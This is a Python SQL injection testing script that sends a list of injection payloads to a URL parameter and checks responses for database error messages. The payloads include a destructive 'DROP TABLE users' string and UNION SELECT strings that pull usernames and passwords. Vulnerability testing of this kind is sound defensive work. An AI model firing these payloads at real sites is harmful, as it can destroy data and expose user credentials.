import requests

class SecurityTester:
    def __init__(self, base_url):
        self.base_url = base_url

    def check_sql_injection(self, param_name, payload):
        """
        Checks if a parameter is vulnerable to SQL injection.

        Parameters
        ----------
        param_name : str
            The name of the parameter to test.
        payload : str
            The SQL injection payload to use.

        Returns
        -------
        bool
            True if the parameter is likely vulnerable, False otherwise.
        """
        print(f"Testing {param_name} for SQL injection...")
        vulnerable = False
        # Construct the URL with the SQL injection payload
        target_url = f"{self.base_url}?{param_name}={payload}"
        print(f"Requesting URL: {target_url}")
        response = requests.get(target_url)

        # Check for common SQL injection error messages in the response
        error_messages = [
            "you have an error in your sql syntax;",
            "unclosed quotation mark after the character string",
            "warning: mysql",
            "ORA-00933",  # Oracle SQL error
            "SQLSTATE[42000]",  # MySQL SQL error
            "syntax error"  # Generic SQL syntax error
        ]

        for error in error_messages:
            if error.lower() in response.text.lower():
                print(f"Potential SQL Injection Vulnerability found with payload: {payload}")
                vulnerable = True
                break

        if not vulnerable:
            print(f"No SQL Injection vulnerability detected with payload: {payload}")

        return vulnerable

    def run_tests(self):
        """
        Run security tests on the website.
        """
        # Example SQL injection payloads including SELECT * statement
        sql_payloads = [
            "' OR '1'='1",  # Classic SQL Injection
            "'; DROP TABLE users; --",  # Destructive SQL Injection
            "' UNION SELECT * FROM users --",  # Attempt to select all data from a table
            "' UNION SELECT * FROM information_schema.tables --",  # Attempt to retrieve table names
            "' UNION SELECT username, password FROM users --",  # Attempt to retrieve specific columns
        ]

        # Test SQL injection on a specific parameter
        for payload in sql_payloads:
            self.check_sql_injection("id", payload)


# EXAMPLE USAGE
if __name__ == "__main__":
    # Replace 'http://example.com/page' with the actual URL to test
    tester = SecurityTester("http://example.com/page")
    tester.run_tests()
